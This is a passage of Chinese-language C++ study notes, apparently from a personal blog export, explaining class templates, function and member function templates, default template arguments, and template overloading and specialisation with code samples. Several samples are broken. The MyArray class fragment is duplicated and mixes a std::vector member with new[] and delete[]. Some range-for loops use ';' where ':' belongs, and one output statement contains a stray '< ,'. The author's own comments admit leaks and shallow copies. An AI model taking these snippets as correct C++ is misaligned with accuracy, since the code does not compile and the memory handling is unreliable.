class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">const_iterator <span class="title">cbegin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	T* data;<span class="comment">//在类中复杂情况可以用智能指针，在老版本不支持创建数组</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//写在类外面，一般都在类外定义</span></span><br><span class="line">MyArray&lt;T&gt;::<span class="built_in">MyArray</span>(<span class="type">size_t</span> count)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (count)</span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="keyword">new</span> T[count]();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">////类外定义需要先把模板头写上去</span></span><br><span class="line">MyArray&lt;T&gt;::~<span class="built_in">MyArray</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (data)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">delete</span>[] data;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//begin的类外定义</span></span><br><span class="line"><span class="keyword">typename</span> MyArray&lt;T&gt;::iterator MyArray&lt;T&gt;::<span class="built_in">begin</span>() <span class="type">const</span><span class="comment">//::前面的名称一定是类名或者明明空间</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line">	~<span class="built_in">MyArray</span>();</span><br><span class="line">	<span class="function">iterator <span class="title">begin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">const_iterator <span class="title">cbegin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line">	T&amp; <span class="keyword">operator</span>[](<span class="type">unsigned</span> count)<span class="type">const</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> data[count];<span class="comment">//重载</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	std::vector&lt;T&gt; data;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//写在类外面，一般都在类外定义</span></span><br><span class="line">MyArray&lt;T&gt;::<span class="built_in">MyArray</span>(<span class="type">size_t</span> count)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (count)</span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="keyword">new</span> T[count]();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">////类外定义需要先把模板头写上去</span></span><br><span class="line">MyArray&lt;T&gt;::~<span class="built_in">MyArray</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (data)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">delete</span>[] data;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">MyArray&lt;T&gt;::<span class="built_in">MyArray</span>(<span class="type">const</span> std::initializer_list&lt;T&gt;&amp; list)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (list.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">unsigned</span> count = <span class="number">0</span>;</span><br><span class="line">		data = <span class="keyword">new</span> T[list.<span class="built_in">size</span>()]();</span><br><span class="line">		<span class="keyword">if</span> (std::is_pointer&lt;T&gt;::value)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">auto</span> elem : list)</span><br><span class="line">			&#123;</span><br><span class="line">				data[count++] = <span class="keyword">new</span> <span class="keyword">typename</span> get_type&lt;T&gt;::<span class="built_in">type</span>(*elem);<span class="comment">//相当于两层指针，在删除时，只删除第一层，会出现内存泄漏</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; elem; list)</span><br><span class="line">			&#123;</span><br><span class="line">				data[count++] = elem;<span class="comment">//存在bug，如果存放的是指针，很变成浅复制</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">MyArray&lt;T&gt;::<span class="built_in">MyArray</span>(std::initializer_list&lt;T&gt;&amp;&amp; list)<span class="comment">//右值引用</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (list.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">unsigned</span> count = <span class="number">0</span>;</span><br><span class="line">		data = <span class="keyword">new</span> T[list.<span class="built_in">size</span>()]();</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; elem; list)</span><br><span class="line">		&#123;</span><br><span class="line">			data[count++] = elem;<span class="comment">//存在bug，如果存放的是指针，很变成浅复制</span></span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">#.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;myArray.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//std::initializer_list&lt;int&gt; iList&#123; 1,2,3,4,5 &#125;;</span></span><br><span class="line">	<span class="comment">//std::vector&lt;int&gt; ivec(iList);//左值类型的初始化,右值类型初始化ivec&#123;1,2,3,4,5&#125;</span></span><br><span class="line">	<span class="type">int</span> i1 = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> i2 = <span class="number">20</span>;</span><br><span class="line">	<span class="type">int</span> i3 = <span class="number">30</span>;</span><br><span class="line">	<span class="type">int</span> i4 = <span class="number">40</span>;</span><br><span class="line">	std::initializer_list&lt;<span class="type">int</span>*&gt; iList&#123; &amp;i1,&amp;i2,&amp;i3,&amp;i4 &#125;;</span><br><span class="line">	<span class="function">MyArray&lt;<span class="type">int</span>*&gt; <span class="title">arrayPi</span><span class="params">(iList)</span></span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; arrayPi[i] &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><strong>在C++的早期版本，为了减少关键字数量，用class来表示模板的参数，但是后来因为第二个原因，不得不引入typename关键字。</strong></p>
<h2 id="函数模板，成员函数模板"><a href="#函数模板，成员函数模板" class="headerlink" title="(*)函数模板，成员函数模板"></a>(*)函数模板，成员函数模板</h2><p>1.普通函数模板的写法与类模板类似</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;myArray.hpp&quot;</span></span></span><br><span class="line"><span class="keyword">namespace</span> mystd</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> iter_type ,<span class="keyword">typename</span> func_type&gt;<span class="comment">//普通函数模板</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">for_each</span><span class="params">(iter_type first, iter_type last, func_type func)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">auto</span> iter = first; iter != last; ++iter)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">func</span>(*iter);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	std::vector&lt;<span class="type">int</span>&gt; ivec&#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line">	mystd::for_each(ivec.<span class="built_in">begin</span>(), ivec.<span class="built_in">end</span>(), [](<span class="type">int</span>&amp; elem) &#123;</span><br><span class="line">		++elem;</span><br><span class="line">		&#125;);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> elem : ivec)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; elem &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><strong>在现代C++中，函数模板一直普遍使用，一定要掌握。</strong></p>
<p> 2.成员函数模板</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;myArray.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mystd</span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> iter_type, <span class="keyword">typename</span> func_type&gt;</span></span><br><span class="line"><span class="function">	<span class="type">void</span> <span class="title">for_each</span><span class="params">(iter_type first, iter_type last, func_type func)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">auto</span> iter = first; iter != last; ++iter)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">func</span>(*iter);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//成员函数模板</span></span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">MyVector</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T2&gt;</span></span><br><span class="line"><span class="function">		<span class="type">void</span> <span class="title">outPut</span><span class="params">(<span class="type">const</span> T2&amp; elem)</span></span>;</span><br><span class="line"></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T2&gt;</span><br><span class="line">	<span class="type">void</span> MyVector&lt;T&gt;::<span class="built_in">outPut</span>(<span class="type">const</span> T2&amp; elem)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; elem &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	mystd::MyVector&lt;<span class="type">int</span>&gt; myVec;</span><br><span class="line">	myVec.<span class="built_in">outPut</span>&lt;<span class="type">int</span>&gt;(<span class="number">20</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<p>成员函数模板使用情况也不少，需要掌握的</p>
<h2 id="默认模板参数"><a href="#默认模板参数" class="headerlink" title="(*)默认模板参数"></a>(*)默认模板参数</h2><p>默认模板参数：</p>
<p>(1) 默认模板参数是一个经常使用的特性，比如在定义vector对象时，我们就可以使用		默认分配器。</p>
<img src="https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图 2023-03-29 135107.png">

<p>(2) 模板参数就和普通函数的默认参数一样，一旦一个参数有了默认参数，它之后的参	  数都必须有默认参数</p>
<p>(3) 函数模板使用默认模板参数</p>
<p>(2) 类模板使用模板参数</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;myArray.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mystd</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> void_int_func_type = std::function&lt;<span class="built_in">void</span>(<span class="type">int</span>&amp;)&gt;;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> iter_type, <span class="keyword">typename</span> func_type=void_int_func_type&gt;<span class="comment">//函数模板使用模板参数,typename这里有默认值，下边都要有默认值</span></span><br><span class="line">	<span class="type">void</span> for_each(iter_type first, iter_type last, func_type func = [](<span class="type">int</span>&amp; elem)&#123;</span><br><span class="line">			++elem;</span><br><span class="line">		&#125;)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">auto</span> iter = first; iter != last; ++iter)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">func</span>(*iter);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> allocator = std::allocator&lt;T&gt;&gt;<span class="comment">//类模板使用默认模板参数</span></span><br><span class="line">	<span class="keyword">class</span> MyVector</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T2&gt;</span><br><span class="line">		<span class="type">void</span> <span class="built_in">outPut</span>(<span class="type">const</span> T2&amp; elem);</span><br><span class="line"></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span> allocator&gt;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="keyword">typename</span> T2&gt;</span><br><span class="line">	<span class="type">void</span> MyVector&lt;T,allocator&gt;::<span class="built_in">outPut</span>(<span class="type">const</span> T2&amp; elem)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; elem &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::vector&lt;<span class="type">int</span>&gt; ivec&#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line">	mystd::for_each(ivec.<span class="built_in">begin</span>(), ivec.<span class="built_in">end</span>());</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> elem : ivec)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; elem &lt;&lt; std::endl;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>几乎stl库都在使用模板参数</p>
<h2 id="模板的重载，全特化和偏特化"><a href="#模板的重载，全特化和偏特化" class="headerlink" title="(*)模板的重载，全特化和偏特化"></a>(*)模板的重载，全特化和偏特化</h2><p>1.模板的重载</p>
<p>(1) 函数模板是可以重载的（类模板不能被重载），通过重载可以应对更加复杂的情况。比如在处理char<em>和string对象时，虽然都可以代表字符串，但char</em>在复制时直接拷贝内存效率明显更高，string就不得不依次调用构造函数了。所以在一些比较最求效率的程序中对不同的类型进行不同的处理还是非常有意义的。</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">const</span> T&amp; parm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;void test(const T&amp; parm)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(T* parm)</span><span class="comment">//若加上const，test(&amp;10)则会调用第一个</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;void test（T* parm)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">double</span> parm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;void test(double parm)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">test</span>(&amp;i);</span><br><span class="line">	<span class="built_in">test</span>(<span class="number">2.2</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">void <span class="built_in">test</span>(const T&amp; parm)</span><br><span class="line">void <span class="built_in">test</span>（T* parm)</span><br><span class="line">void <span class="built_in">test</span>(double parm)</span><br></pre></td></tr></table></figure>



<p>其实函数模板的重载和普通函数的重载没有什么区别。</p>
<p>2.模板的特化</p>
<p>(1) 模板特化的意义：函数模板可以重载以应对更加精细的情况。类模板不能重载，但可以特化来实现类似的功能。</p>
<p>(2) 模板的特化也分为两种，全特化和偏特化。模板的全特化：就是指模板的实参列表与与相应的模板参数列表一一对应。</p>
<p>(3) 模板的偏特化：偏特化就是介于普通模板和全特化之间，只存在部分类型明确化，而非将模板唯一化。</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1,<span class="keyword">typename</span> T2&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;common template&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&lt;T1*, T2*&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;point semi-template&quot;</span> &lt; , std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T2&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&lt;<span class="type">int</span>, T2&gt;<span class="comment">//只写一部分叫偏特化</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;int ssssemi-special&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;int,int complete special&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Test&lt;<span class="type">int</span>*, <span class="type">int</span>*&gt; test;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p><strong>(4)</strong> <strong>其实对于函数模板来说，特化与重载可以理解为一个东西。</strong></p>
<p> <strong>总结：函数模板的重载，类模板的特化。还是比较重要的知识点，应当掌握，在一些比较复杂的程序中，模板重载与特化是经常使用的。</strong></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
</search>
